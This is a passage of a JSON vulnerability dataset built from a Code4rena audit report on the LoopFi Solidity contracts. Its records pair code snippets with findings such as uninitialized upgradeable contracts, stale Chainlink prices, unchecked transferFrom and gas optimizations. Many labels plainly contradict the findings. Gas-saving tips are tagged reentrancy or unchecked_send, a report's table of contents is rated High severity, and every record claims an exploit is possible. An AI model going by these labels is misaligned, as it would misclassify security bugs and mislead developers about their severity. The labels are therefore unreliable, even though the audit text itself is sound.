    "description": "See [this](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps) link for a description of this storage variable. While some contracts may not currently be sub-classed, adding the variable now protects against forgetting to add it in the future. *Instances (18)*: File: src/oracle/BalancerOracle.sol 4: import {UUPSUpgradeable} from \"@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol\"; 5: import {AccessControlUpgradeable} from \"@openzeppelin/contracts-upgradeable/access/AccessControlUpgradeable.sol\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.486,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n6: import {Initializable} from \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\n\n7: import {OwnableUpgradeable} from \"@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol\";\n\n8: import {PausableUpgradeable} from \"@openzeppelin/contracts-upgradeable/security/PausableUpgradeable.sol\";\n\n20: contract ChefIncentivesController is Initializable, PausableUpgradeable, OwnableUpgradeable, RecoverERC20 {\n\n224:         _disableInitializers();\n\n234:     function initialize(\n\n241:     ) public initializer {\n\n247:         __Ownable_init();\n\n248:         __Pausable_init();\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Low",
    "title": "<a name=\"L-27\"></a>[L-27] Upgradeable contract not initialized",
    "description": "Upgradeable contracts are initialized via an initializer function rather than by a constructor. Leaving such a contract uninitialized may lead to it being taken over by a malicious user *Instances (37)*: File: src/oracle/BalancerOracle.sol 4: import {UUPSUpgradeable} from \"@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol\"; 5: import {AccessControlUpgradeable} from \"@openzeppelin/contracts-upgradeable/access/AccessControlUpgradeable.sol\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 22,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.653,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/PoolV3.sol\n\n385:         IERC20(underlyingToken).safeTransferFrom({from: msg.sender, to: address(this), value: assetsSent}); // U:[LP-6,7]\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "<a name=\"M-1\"></a>[M-1] Contracts are vulnerable to fee-on-transfer accounting-related issues",
    "description": "Consistently check account balance before and after transfers for Fee-On-Transfer discrepancies. As arbitrary ERC20 tokens can be used, the amount here should be calculated every time to take into consideration a possible fee-on-transfer or deflation. Also, it's a good practice for the future of the solution. Use the balance before and after the transfer to calculate the received amount instead of assuming that it would be equal to the amount passed as a parameter. Or explicitly document that such tokens shouldn't be used and won't be supported *Instances (5)*: File: src/CDPVault.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.159,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/CDPVault.sol\n\n318:         position.lastDebtUpdate = uint64(block.number); // U:[CM-10,11]\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "<a name=\"M-2\"></a>[M-2] `block.number` means different things on different L2s",
    "description": "On Optimism, `block.number` is the L2 block number, but on Arbitrum, it's the L1 block number, and `ArbSys(address(100)).arbBlockNumber()` must be used. Furthermore, L2 block numbers often occur much more frequently than L1 block numbers (any may even occur on a per-transaction basis), so using block numbers for timing results in inconsistencies, especially when voting is involved across multiple chains. As of version 4.9, OpenZeppelin has [modified](https://blog.openzeppelin.com/introducing-openzeppelin-contracts-v4.9#governor) their governor code to use a clock rather than block numbers, to avoid these sorts of issues, but this still requires that the project [implement](https://docs.openzeppelin.com/contracts/4.x/governance#token_2) a [clock](https://eips.ethereum.org/EIPS/eip-6372) for each L2. *Instances (1)*: File: src/CDPVault.sol 318:         position.lastDebtUpdate = uint64(block.number); // U:[CM-10,11] [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.111,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n272:     function setBountyManager(address _bountyManager) external onlyOwner {\n\n281:     function setEligibilityMode(EligibilityModes _newVal) external onlyOwner {\n\n291:     function start() public onlyOwner {\n\n318:     function batchUpdateAllocPoint(address[] calldata _tokens, uint256[] calldata _allocPoints) external onlyOwner {\n\n342:     function setRewardsPerSecond(uint256 _rewardsPerSecond, bool _persist) external onlyOwner {\n\n397:     ) external onlyOwner {\n\n430:     function recoverERC20(address tokenAddress, uint256 tokenAmount) external onlyOwner {\n\n581:     function setContractAuthorization(address _address, bool _authorize) external onlyOwner {\n\n909:     function setEndingTimeUpdateCadence(uint256 _lapse) external onlyOwner {\n\n920:     function registerRewardDeposit(uint256 _amount) external onlyOwner {\n\n966:     function pause() external onlyOwner {\n\n973:     function unpause() external onlyOwner {\n\n1005:     function setAddressWLstatus(address user, bool status) external onlyOwner {\n\n1012:     function toggleWhitelist() external onlyOwner {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "Impact",
    "description": "Contracts have owners with privileged rights to perform admin tasks and need to be trusted to not perform malicious updates or drain funds. *Instances (47)*: File: src/CDPVault.sol 39: contract CDPVault is AccessControl, Pause, Permission, ICDPVaultBase { 195:     function setParameter(bytes32 parameter, uint256 data) external whenNotPaused onlyRole(VAULT_CONFIG_ROLE) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 32,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/vendor/AuraVault.sol\n\n383:         (, int256 answer, , , ) = AggregatorV3Interface(ETH_CHAINLINK_FEED).latestRoundData();\n             ethPrice = wdiv(uint256(answer), ETH_CHAINLINK_DECIMALS);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Medium",
    "title": "<a name=\"M-4\"></a>[M-4] Chainlink's `latestRoundData` might return stale or incorrect results",
    "description": "- This is a common issue: <https://github.com/code-423n4/2022-12-tigris-findings/issues/655>, <https://code4rena.com/reports/2022-10-inverse#m-17-chainlink-oracle-data-feed-is-not-sufficiently-validated-and-can-return-stale-price>, <https://app.sherlock.xyz/audits/contests/41#issue-m-12-chainlinks-latestrounddata--return-stale-or-incorrect-result> and many more occurrences. `latestRoundData()` is used to fetch the asset price from a Chainlink aggregator, but it's missing additional validations to ensure that the round is complete. If there is a problem with Chainlink starting a new round and finding consensus on the new value for the oracle (e.g. Chainlink nodes abandon the oracle, chain congestion, vulnerability/attacks on the Chainlink system) consumers of this contract may continue using outdated stale data / stale prices. More bugs related to chainlink here: [Chainlink Oracle Security Considerations](https://medium.com/cyfrin/chainlink-oracle-defi-attacks-93b6cb6541bf#99af) *Instances (1)*: File: src/vendor/AuraVault.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.213,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/vendor/AuraVault.sol\n\n383:         (, int256 answer, , , ) = AggregatorV3Interface(ETH_CHAINLINK_FEED).latestRoundData();\n             ethPrice = wdiv(uint256(answer), ETH_CHAINLINK_DECIMALS);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Medium",
    "title": "<a name=\"M-5\"></a>[M-5] Missing checks for whether the L2 Sequencer is active",
    "description": "Chainlink recommends that users using price oracles, check whether the Arbitrum Sequencer is [active](https://docs.chain.link/data-feeds/l2-sequencer-feeds#arbitrum). If the sequencer goes down, the Chainlink oracles will have stale prices from before the downtime, until a new L2 OCR transaction goes through. Users who submit their transactions via the [L1 Dealyed Inbox](https://developer.arbitrum.io/tx-lifecycle#1b--or-from-l1-via-the-delayed-inbox) will be able to take advantage of these stale prices. Use a [Chainlink oracle](https://blog.chain.link/how-to-use-chainlink-price-feeds-on-arbitrum/#almost_done!_meet_the_l2_sequencer_health_flag) to determine whether the sequencer is offline or not, and don't allow operations to take place while the sequencer is offline. *Instances (1)*: File: src/vendor/AuraVault.sol 383:         (, int256 answer, , , ) = AggregatorV3Interface(ETH_CHAINLINK_FEED).latestRoundData(); ethPrice = wdiv(uint256(answer), ETH_CHAINLINK_DECIMALS);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.213,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/Flashlender.sol\n\n105:         underlyingToken.transferFrom(address(receiver), address(pool), total);\n\n133:         underlyingToken.transferFrom(address(receiver), address(pool), total);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "<a name=\"M-6\"></a>[M-6] Return values of `transfer()`/`transferFrom()` not checked",
    "description": "Not all `IERC20` implementations `revert()` when there's a failure in `transfer()`/`transferFrom()`. The function signature has a `boolean` return value and they indicate errors that way instead. By not checking the return value, operations that should have marked as failed, may potentially go through without actually making a payment *Instances (2)*: File: src/Flashlender.sol 105:         underlyingToken.transferFrom(address(receiver), address(pool), total); 133:         underlyingToken.transferFrom(address(receiver), address(pool), total);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.206,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/Flashlender.sol\n\n105:         underlyingToken.transferFrom(address(receiver), address(pool), total);\n\n133:         underlyingToken.transferFrom(address(receiver), address(pool), total);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "<a name=\"M-7\"></a>[M-7] Unsafe use of `transfer()`/`transferFrom()` with `IERC20`",
    "description": "Some tokens do not implement the ERC20 standard properly but are still accepted by most code that accepts ERC20 tokens.  For example Tether (USDT)'s `transfer()` and `transferFrom()` functions on L1 do not return booleans as the specification requires, and instead have no return value. When these sorts of tokens are cast to `IERC20`, their [function signatures](https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca) do not match and therefore the calls made, revert (see [this](https://gist.github.com/IllIllI000/2b00a32e8f0559e8f386ea4f1800abc5) link for a test case). Use OpenZeppelin's `SafeERC20`'s `safeTransfer()`/`safeTransferFrom()` instead *Instances (2)*: File: src/Flashlender.sol 105:         underlyingToken.transferFrom(address(receiver), address(pool), total); 133:         underlyingToken.transferFrom(address(receiver), address(pool), total);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.206,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "Automated Findings / Publicly Known Issues",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "Automated Findings / Publicly Known Issues",
    "description": "The 4naly3er report can be found [here](https://github.com/code-423n4/2024-07-loopfi/blob/main/4naly3er-report.md). _Note for C4 wardens: Anything included in this `Automated Findings / Publicly Known Issues` section is considered a publicly known issue and is ineligible for awards._ All of the previous findings from the previous audit reports from Watchpug",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.042,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "array[index] = array[index] + amount",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "High",
    "title": "# Report",
    "description": "- [Report](#report) - [Gas Optimizations](#gas-optimizations) - [\\[GAS-1\\] Don't use `_msgSender()` if not supporting EIP-2771](#gas-1-dont-use-_msgsender-if-not-supporting-eip-2771) - [\\[GAS-2\\] `a = a + b` is more gas effective than `a += b` for state variables (excluding arrays and mappings)](#gas-2-a--a--b-is-more-gas-effective-than-a--b-for-state-variables-excluding-arrays-and-mappings) - [\\[GAS-3\\] Use assembly to check for `address(0)`](#gas-3-use-assembly-to-check-for-address0)",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.036,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "array[index] = array[index] + amount",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Gas Optimizations",
    "description": "| |Issue|Instances| |-|:-|:-:| | [GAS-1](#GAS-1) | Don't use `_msgSender()` if not supporting EIP-2771 | 4 | | [GAS-2](#GAS-2) | `a = a + b` is more gas effective than `a += b` for state variables (excluding arrays and mappings) | 23 | | [GAS-3](#GAS-3) | Use assembly to check for `address(0)` | 50 |",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.036,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/CDPVault.sol\n\n476:         cdd.cumulativeQuotaInterest += position.cumulativeQuotaInterest;\n\n480:         cdd.accruedInterest += cdd.cumulativeQuotaInterest;\n\n670:                 profit += cumulativeQuotaInterest; // U:[CL-3]\n\n676:                 profit += amountToRepay; // U:[CL-3]\n\n695:                 profit += interestAccrued;\n\n700:                 profit += amountToRepay; // U:[CL-3]\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"GAS-2\"></a>[GAS-2] `a = a + b` is more gas effective than `a += b` for state variables (excluding arrays and mappings)",
    "description": "This saves **16 gas per instance.** *Instances (23)*: File: src/CDPVault.sol 476:         cdd.cumulativeQuotaInterest += position.cumulativeQuotaInterest; 480:         cdd.accruedInterest += cdd.cumulativeQuotaInterest;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.414,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n142:     bool public persistRewardsPerSecond;\n\n161:     mapping(address => bool) private validRTokens;\n\n173:     mapping(address => bool) public eligibilityExempt;\n\n206:     mapping(address => bool) public authorizedContracts;\n\n209:     mapping(address => bool) public whitelist;\n\n211:     bool public whitelistActive;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "<a name=\"GAS-5\"></a>[GAS-5] Using bools for storage incurs overhead",
    "description": "Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas), and to avoid Gsset (20000 gas) when changing from \u2018false\u2019 to \u2018true\u2019, after having been \u2018true\u2019 in the past. See [source](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27). *Instances (18)*: File: src/PoolV3.sol 82:     bool public locked; 107:     mapping(address => bool) internal _allowed;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.376,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/proxy/PositionAction.sol\n\n323:                 _transferFrom(upFrontToken, collateralizer, self, upFrontAmount, permitParams);\n\n328:         IPermission(leverParams.vault).modifyPermission(leverParams.position, self, true);\n\n330:             IERC3156FlashBorrower(self),\n\n331:             address(underlyingToken),\n\n335:         IPermission(leverParams.vault).modifyPermission(leverParams.position, self, false);\n\n366:             ICreditFlashBorrower(self),\n\n370:         IPermission(leverParams.vault).modifyPermission(leverParams.position, self, false);\n\n404:             address(swapAction),\n\n424:         underlyingToken.forceApprove(address(flashlender), addDebt);\n\n477:                     address(swapAction),\n\n489:         underlyingToken.forceApprove(address(flashlender), subDebt);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"GAS-7\"></a>[GAS-7] State variables should be cached in stack variables rather than re-reading them from storage",
    "description": "The instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (100 gas) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses. *Saves 100 gas per instance* *Instances (32)*: File: src/CDPVault.sol 441:             uint256 amount = wmul(abs(deltaCollateral), tokenScale);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 26,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.813,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/PoolV3.sol\n\n7: import {SafeERC20} from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n9: import {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n10: import {IERC4626} from \"@openzeppelin/contracts/interfaces/IERC4626.sol\";\n\n11: import {IERC20Metadata} from \"@openzeppelin/contracts/interfaces/IERC20Metadata.sol\";\n\n12: import {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\n13: import {ERC4626} from \"@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol\";\n\n14: import {ERC20Permit} from \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol\";\n\n16: import {Math} from \"@openzeppelin/contracts/utils/math/Math.sol\";\n\n17: import {SafeCast} from \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\n\n18: import {EnumerableSet} from \"@openzeppelin/contracts/utils/structs/EnumerableSet.sol\";\n\n21: import {IAddressProviderV3, AP_TREASURY, NO_VERSION_CONTROL} from \"@gearbox-protocol/core-v3/contracts/interfaces/IAddressProviderV3.sol\";\n\n22: import {ICreditManagerV3} from \"@gearbox-protocol/core-v3/contracts/interfaces/ICreditManagerV3.sol\";\n\n23: import {ILinearInterestRateModelV3} from \"@gearbox-protocol/core-v3/contracts/interfaces/ILinearInterestRateModelV3.sol\";\n\n24: import {IPoolQuotaKeeperV3} from \"@gearbox-protocol/core-v3/contracts/interfaces/IPoolQuotaKeeperV3.sol\";\n\n25: import {IPoolV3} from \"@gearbox-protocol/core-v3/contracts/interfaces/IPoolV3.sol\";\n\n28: import {CreditLogic} from \"@gearbox-protocol/core-v3/contracts/libraries/CreditLogic.sol\";\n\n29: import {ACLNonReentrantTrait} from \"@gearbox-protocol/core-v3/contracts/traits/ACLNonReentrantTrait.sol\";\n\n30: import {ContractsRegisterTrait} from \"@gearbox-protocol/core-v3/contracts/traits/ContractsRegisterTrait.sol\";\n\n33: import {RAY, MAX_WITHDRAW_FEE, SECONDS_PER_YEAR, PERCENTAGE_FACTOR} from \"@gearbox-protocol/core-v2/contracts/libraries/Constants.sol\";\n\n35: import {ICDM} from \"./interfaces/ICDM.sol\";\n\n38: import \"@gearbox-protocol/core-v3/contracts/interfaces/IExceptions.sol\";\n\n131:         if (msg.sender != poolQuotaKeeper) revert CallerNotPoolQuotaKeeperException(); // U:[LP-2C]\n\n137:             revert CallerNotCreditManagerException(); // U:[PQK-4]\n\n142:         if (locked) revert PoolV3LockedException(); // U:[LP-2C]\n\n160:         ACLNonReentrantTrait(addressProvider_) // U:[LP-1A]\n\n162:         ERC4626(IERC20(underlyingToken_)) // U:[LP-1B]\n\n163:         ERC20(name_, symbol_) // U:[LP-1B]\n\n164:         ERC20Permit(name_) // U:[LP-1B]\n\n165:         nonZeroAddress(underlyingToken_) // U:[LP-1A]\n\n166:         nonZeroAddress(interestRateModel_) // U:[LP-1A]\n\n168:         addressProvider = addressProvider_; // U:[LP-1B]\n\n169:         underlyingToken = underlyingToken_; // U:[LP-1B]\n\n174:         }); // U:[LP-1B]\n\n176:         lastBaseInterestUpdate = uint40(block.timestamp); // U:[LP-1B]\n\n177:         _baseInterestIndexLU = uint128(RAY); // U:[LP-1B]\n\n179:         interestRateModel = interestRateModel_; // U:[LP-1B]\n\n180:         emit SetInterestRateModel(interestRateModel_); // U:[LP-1B]\n\n188:         _setTotalDebtLimit(totalDebtLimit_); // U:[LP-1B]\n\n203:         return IERC20(underlyingToken).balanceOf(address(this)); // U:[LP-3]\n\n209:         return _expectedLiquidityLU + _calcBaseInterestAccrued() + _calcQuotaRevenueAccrued(); // U:[LP-4]\n\n237:         whenNotPaused // U:[LP-2A]\n\n238:         nonReentrant // U:[LP-2B]\n\n239:         nonZeroAddress(receiver) // U:[LP-5]\n\n242:         uint256 assetsReceived = _amountMinusFee(assets); // U:[LP-6]\n\n243:         shares = _convertToShares(assetsReceived); // U:[LP-6]\n\n244:         _deposit(receiver, assets, assetsReceived, shares); // U:[LP-6]\n\n253:         shares = deposit(assets, receiver); // U:[LP-2A,2B,5,6]\n\n254:         emit Refer(receiver, referralCode, assets); // U:[LP-6]\n\n267:         whenNotPaused // U:[LP-2A]\n\n268:         nonReentrant // U:[LP-2B]\n\n269:         nonZeroAddress(receiver) // U:[LP-5]\n\n272:         uint256 assetsReceived = _convertToAssets(shares); // U:[LP-7]\n\n273:         assets = _amountWithFee(assetsReceived); // U:[LP-7]\n\n274:         _deposit(receiver, assets, assetsReceived, shares); // U:[LP-7]\n\n283:         assets = mint(shares, receiver); // U:[LP-2A,2B,5,7]\n\n284:         emit Refer(receiver, referralCode, assets); // U:[LP-7]\n\n299:         whenNotPaused // U:[LP-2A]\n\n301:         nonReentrant // U:[LP-2B]\n\n302:         nonZeroAddress(receiver) // U:[LP-5]\n\n306:         uint256 assetsSent = _amountWithWithdrawalFee(assetsToUser); // U:[LP-8]\n\n307:         shares = _convertToShares(assetsSent); // U:[LP-8]\n\n308:         _withdraw(receiver, owner, assetsSent, assets, assetsToUser, shares); // U:[LP-8]\n\n323:         whenNotPaused // U:[LP-2A]\n\n325:         nonReentrant // U:[LP-2B]\n\n326:         nonZeroAddress(receiver) // U:[LP-5]\n\n329:         uint256 assetsSent = _convertToAssets(shares); // U:[LP-9]\n\n331:         assets = _amountMinusFee(assetsToUser); // U:[LP-9]\n\n332:         _withdraw(receiver, owner, assetsSent, assets, assetsToUser, shares); // U:[LP-9]\n\n337:         shares = _convertToShares(_amountMinusFee(assets)); // U:[LP-10]\n\n342:         return _amountWithFee(_convertToAssets(shares)); // U:[LP-10]\n\n347:         return _convertToShares(_amountWithWithdrawalFee(_amountWithFee(assets))); // U:[LP-10]\n\n352:         return _amountMinusFee(_amountMinusWithdrawalFee(_convertToAssets(shares))); // U:[LP-10]\n\n357:         return paused() ? 0 : type(uint256).max; // U:[LP-11]\n\n362:         return paused() ? 0 : type(uint256).max; // U:[LP-11]\n\n372:                 ); // U:[LP-11]\n\n377:         return paused() ? 0 : Math.min(balanceOf(owner), _convertToShares(availableLiquidity())); // U:[LP-11]\n\n385:         IERC20(underlyingToken).safeTransferFrom({from: msg.sender, to: address(this), value: assetsSent}); // U:[LP-6,7]\n\n391:         }); // U:[LP-6,7]\n\n393:         _mint(receiver, shares); // U:[LP-6,7]\n\n394:         emit Deposit(msg.sender, receiver, assetsSent, shares); // U:[LP-6,7]\n\n409:         if (msg.sender != owner) _spendAllowance({owner: owner, spender: msg.sender, amount: shares}); // U:[LP-8,9]\n\n410:         _burn(owner, shares); // U:[LP-8,9]\n\n413:             expectedLiquidityDelta: -assetsSent.toInt256(),\n\n414:             availableLiquidityDelta: -assetsSent.toInt256(),\n\n416:         }); // U:[LP-8,9]\n\n418:         IERC20(underlyingToken).safeTransfer({to: receiver, value: amountToUser}); // U:[LP-8,9]\n\n421:                 IERC20(underlyingToken).safeTransfer({to: treasury, value: assetsSent - amountToUser}); // U:[LP-8,9]\n\n424:         emit Withdraw(msg.sender, receiver, owner, assetsReceived, shares); // U:[LP-8,9]\n\n431:         return assets; //(assets == 0 || supply == 0) ? assets : assets.mulDiv(supply, totalAssets(), rounding);\n\n438:         return shares; //(supply == 0) ? shares : shares.mulDiv(totalAssets(), supply, rounding);\n\n467:         borrowable = _borrowable(_totalDebt); // U:[LP-12]\n\n468:         if (borrowable == 0) return 0; // U:[LP-12]\n\n470:         borrowable = Math.min(borrowable, _borrowable(_creditManagerDebt[creditManager])); // U:[LP-12]\n\n471:         if (borrowable == 0) return 0; // U:[LP-12]\n\n476:         }); // U:[LP-12]\n\n478:         borrowable = Math.min(borrowable, available); // U:[LP-12]\n\n490:         creditManagerOnly // U:[LP-2C]\n\n491:         whenNotPaused // U:[LP-2A]\n\n492:         nonReentrant // U:[LP-2B]\n\n497:         uint128 totalBorrowed_ = _totalDebt.borrowed + borrowedAmountU128;\n\n498:         uint128 cmBorrowed_ = cmDebt.borrowed + borrowedAmountU128;\n\n500:             revert CreditManagerCantBorrowException(); // U:[LP-2C,13A]\n\n505:             availableLiquidityDelta: -borrowedAmount.toInt256(),\n\n507:         }); // U:[LP-13B]\n\n509:         cmDebt.borrowed = cmBorrowed_; // U:[LP-13B]\n\n510:         _totalDebt.borrowed = totalBorrowed_; // U:[LP-13B]\n\n512:         IERC20(underlyingToken).safeTransfer({to: creditAccount, value: borrowedAmount}); // U:[LP-13B]\n\n513:         emit Borrow(msg.sender, creditAccount, borrowedAmount); // U:[LP-13B]\n\n536:         creditManagerOnly // U:[LP-2C]\n\n537:         whenNotPaused // U:[LP-2A]\n\n538:         nonReentrant // U:[LP-2B]\n\n545:             revert CallerNotCreditManagerException(); // U:[LP-2C,14A]\n\n549:             _mint(treasury, convertToShares(profit)); // U:[LP-14B]\n\n558:                         loss: convertToAssets(sharesToBurn - sharesInTreasury)\n\n559:                     }); // U:[LP-14D]\n\n563:             _burn(treasury_, sharesToBurn); // U:[LP-14C,14D]\n\n567:             expectedLiquidityDelta: -loss.toInt256(),\n\n570:         }); // U:[LP-14B,14C,14D]\n\n572:         _totalDebt.borrowed -= repaidAmountU128; // U:[LP-14B,14C,14D]\n\n573:         cmDebt.borrowed = cmBorrowed - repaidAmountU128; // U:[LP-14B,14C,14D]\n\n575:         emit Repay(msg.sender, repaidAmount, profit, loss); // U:[LP-14B,14C,14D]\n\n587:             return limit - borrowed;\n\n608:             ((baseInterestRate_ * _totalDebt.borrowed) * (PERCENTAGE_FACTOR - withdrawFee)) /\n\n609:             PERCENTAGE_FACTOR /\n\n610:             assets; // U:[LP-15]\n\n616:         if (block.timestamp == timestampLU) return _baseInterestIndexLU; // U:[LP-16]\n\n617:         return _calcBaseInterestIndex(timestampLU); // U:[LP-16]\n\n628:         if (block.timestamp == timestampLU) return 0; // U:[LP-17]\n\n629:         return 